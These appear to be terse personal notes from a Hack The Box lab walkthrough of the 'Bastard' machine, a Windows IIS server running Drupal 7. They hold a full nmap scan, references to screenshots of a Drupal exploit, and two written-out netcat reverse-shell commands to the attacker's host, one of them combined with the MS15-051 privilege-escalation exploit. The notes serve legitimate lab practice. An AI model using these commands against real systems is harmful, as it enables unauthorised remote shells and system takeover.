nmap
```
┌──(kali㉿kali)-[~/HTB/bastard]
└─$ sudo nmap -T5 -p- -A -oN nmap 10.129.17.90                
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-15 00:30 EST
Nmap scan report for 10.129.17.90
Host is up (0.046s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to Bastard | Bastard
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|specialized|phone
Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|2012|8.1 (96%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8.1
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (96%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (92%), Microsoft Windows Vista or Windows 7 (91%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows 8.1 Update 1 (91%), Microsoft Windows Phone 7.5 or 8.0 (91%), Microsoft Windows Server 2012 R2 (90%), Microsoft Windows Server 2008 R2 (88%), Microsoft Windows Server 2008 R2 or Windows 8.1 (88%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   48.66 ms 10.10.14.1
2   49.22 ms 10.129.17.90

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 154.54 seconds
```

```

```

![Pasted image 20250115133428](<0. Attachments/Pasted image 20250115133428.png>)
![Pasted image 20250115133521](<0. Attachments/Pasted image 20250115133521.png>)

![Pasted image 20250115134225](<0. Attachments/Pasted image 20250115134225.png>)

using php-curl
![Pasted image 20250115134954](<0. Attachments/Pasted image 20250115134954.png>)

![Pasted image 20250115135010](<0. Attachments/Pasted image 20250115135010.png>)

cracking pass hash - no requirement it would take too long

we have this instead
![Pasted image 20250115140205](<0. Attachments/Pasted image 20250115140205.png>)

```
\\10.10.14.4\share\nc64.exe%20-e%20cmd.exe%2010.10.14.4%20443
```
![Pasted image 20250115141412](<0. Attachments/Pasted image 20250115141412.png>)

![Pasted image 20250115141439](<0. Attachments/Pasted image 20250115141439.png>)

![Pasted image 20250115141626](<0. Attachments/Pasted image 20250115141626.png>)

priv esc
https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip

```
\\10.10.14.4\kali\ms15-051x64.exe "\\10.10.14.4\kali\nc64.exe -e cmd.exe 10.10.14.4 4444"
```

![Pasted image 20250115142318](<0. Attachments/Pasted image 20250115142318.png>)

